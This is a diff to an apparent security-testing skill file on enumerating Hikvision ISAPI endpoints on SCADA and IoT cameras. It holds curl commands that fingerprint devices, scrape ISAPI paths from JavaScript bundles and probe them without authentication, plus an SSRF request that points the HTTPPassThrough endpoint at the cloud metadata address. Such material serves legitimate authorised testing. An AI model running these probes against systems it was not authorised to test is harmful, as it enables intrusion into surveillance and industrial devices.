@@ -6,13 +6,14 @@ revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
 compatibility: Requires curl, nmap, python3
-tags: [recon, SCADA, Hikvision, ISAPI, IoT, camera, RTSP, ONVIF, industrial]
-category: recon
-related_skills:
-  - port-service-discovery
-  - hunt-ssrf
-  - iot-camera-recon
-  - js-secrets-extraction
+metadata:
+  tags: [recon, SCADA, Hikvision, ISAPI, IoT, camera, RTSP, ONVIF, industrial]
+  category: recon
+  related_skills:
+    - port-service-discovery
+    - hunt-ssrf
+    - iot-camera-recon
+    - js-secrets-extraction
 ---
 
 # SCADA Hikvision ISAPI Enumeration
@@ -33,6 +34,19 @@ Enumerate Hikvision ISAPI (Intelligent Security Application Programming Interfac
 - Access to the web interface (even without authentication).
 - The target serves JavaScript bundles — download them for endpoint extraction.
 
+## How to Run
+
+```bash
+# Fingerprint the web interface
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET:PORT/" | grep -iE "server|x-powered"
+
+# Download the main JS bundle and scan for ISAPI endpoints
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/" | grep -Eo 'src="([^"]+\.js[^"]*)"' | while read -r match; do
+  js_url=$(echo "$match" | grep -Eo '(\./[^"]+\.js[^"]*|/[^"]+\.js[^"]*)')
+  [ -n "$js_url" ] && curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT$js_url" | grep -Po '/ISAPI/[^"'\''\s]{5,80}' | sort -u
+done
+```
+
 ## Quick Detection
 
 ```bash
@@ -42,7 +56,7 @@ curl --max-time 30 --connect-timeout 10 -skI "https://TARGET:PORT/" | grep -iE "
 # Download the main JS bundle and scan for ISAPI endpoints
 curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/" | grep -Eo 'src="([^"]+\.js[^"]*)"' | while read -r match; do
   js_url=$(echo "$match" | grep -Eo '(\./[^"]+\.js[^"]*|/[^"]+\.js[^"]*)')
-  [ -n "$js_url" ] && curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT$js_url" | grep -Eo '/ISAPI/[^"'\''\s]{5,80}' | sort -u
+  [ -n "$js_url" ] && curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT$js_url" | grep -Po '/ISAPI/[^"'\''\s]{5,80}' | sort -u
 done
 ```
 
@@ -103,13 +117,13 @@ for path in "${ISAPI_PATHS[@]}"; do
   response=$(curl --max-time 30 --connect-timeout 10 -sk -w "\n%{http_code}" "https://TARGET:PORT$path" 2>/dev/null)
   code=$(echo "$response" | tail -1)
   body=$(echo "$response" | head -n -1)
-  
+
   echo "=== $path ($code) ==="
   echo "$body" | head -5
-  
+
   # Decode error codes
   if echo "$body" | grep -q "ErrorCode"; then
-    error=$(echo "$body" | grep -Eo 'ErrorCode\"?\s*[:\s]*(\d+)' | grep -Eo '\d+')
+    error=$(echo "$body" | grep -Po 'ErrorCode\"?\s*[:\s]*(\d+)' | grep -Po '\d+')
     case $error in
       216) echo "  → SESSION_ERROR (auth required)";;
       401) echo "  → UNAUTHORIZED";;
@@ -181,7 +195,7 @@ Prioritize these endpoints which may enable SSRF, data access, or privilege esca
 # HTTP pass-through (potential SSRF)
 curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough" \
   -H "Content-Type: application/json" \
-  -d '{"url":"http://[REDACTED_IP]/"}' 
+  -d '{"url":"http://169.254.169.254/"}'
 
 # Cloud storage configuration exposure
 curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"
@@ -208,6 +222,8 @@ curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee
 3. Test each endpoint with and without Basic auth credentials.
 4. If any endpoint returns data without authentication, document the exposed information.
 5. Map the attack surface: cameras, streaming, storage, permissions, remote sites.
+
+---
 
 ## Related Skills
 
